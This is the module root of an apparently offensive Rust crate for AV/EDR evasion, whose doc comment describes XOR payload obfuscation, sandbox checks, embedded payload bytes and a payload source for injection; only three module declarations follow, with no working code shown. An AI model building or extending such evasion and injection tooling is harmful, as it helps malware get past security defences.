//! AV/EDR evasion primitives (the `feat/av-bypass` workbench).
//!
//! Safe-only by workspace rule (`unsafe_code = "forbid"` outside `abi`): every
//! module here is pure Rust — XOR is arithmetic, sandbox checks read env vars,
//! payload materialization is byte math. Nothing here calls into the OS.
//!
//! Layering: `bypass` sits directly above `abi` (it wraps the embedded payload
//! bytes), and is consumed by `keyring` (payload source for injection) and
//! `cli` (startup sandbox gate). No cycles.

pub mod entropy;
pub mod sandbox;
pub mod strings;
